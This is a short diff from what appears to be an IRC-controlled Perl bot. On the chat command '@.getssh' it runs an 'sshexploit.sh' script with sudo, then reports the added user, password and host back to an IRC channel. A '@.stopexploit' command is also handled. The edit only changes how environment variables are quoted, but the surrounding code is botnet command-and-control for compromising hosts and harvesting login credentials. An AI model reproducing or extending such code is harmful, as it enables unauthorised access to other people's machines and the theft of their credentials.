@@ -64,7 +64,7 @@ $irc->on(irc_privmsg => sub {
   if ($msg =~ /@.getssh/) {
   system 'sudo sh sshexploit.sh';
   system 'sudo source sshexploit.sh';
-  $irc->write(notice => $noticechan => "9,1Added user: $ENV{US3R} password: $ENV{P4SSWD} on host:$ENV{H0ST}");
+  $irc->write(notice => $noticechan => "9,1Added user: $ENV{'US3R'} password: $ENV{'P4SSWD'} on host:$ENV{'H0ST'}");
  }
  elsif ($msg =~ /@.stopexploit/) {
   warn 'stopexploit called, killing...';
